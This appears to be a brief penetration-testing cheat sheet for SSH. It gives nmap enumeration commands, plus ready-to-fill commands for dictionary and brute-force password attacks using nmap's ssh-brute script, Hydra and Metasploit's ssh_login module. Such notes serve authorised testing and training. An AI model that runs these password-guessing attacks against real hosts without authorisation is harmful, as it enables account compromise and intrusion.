# SSH

## nmap
Enumerate algorithms
```
nmap [TARGET-IP] -p 22 --script ssh2-enum-algo
```
Get ssh-rsa key
```
nmap [TARGET-IP] -p 22 --script ssh2-hostkey --script-args ssh_hostkey=full
```
Get authentication methods
```
nmap [TARGET-IP] -p 22 --script ssh2-auth-methods --script-args="ssh.user=[USERNAME]"
```
SSH dictionary attack
```
nmap [TARGET-IP] -p 22 --script ssh-brute --script-args userdb=[WORDLIST-PATH]
```

## Hydra
```
hydra -l [USERNAME] -P [WORDLIST-PATH] [TARGET-IP] ssh
```

## Metasploit
```
msfconsole
```
```
use auxiliary/scanner/ssh/ssh_login
```
```
show options
```
Set options
```
exploit
```
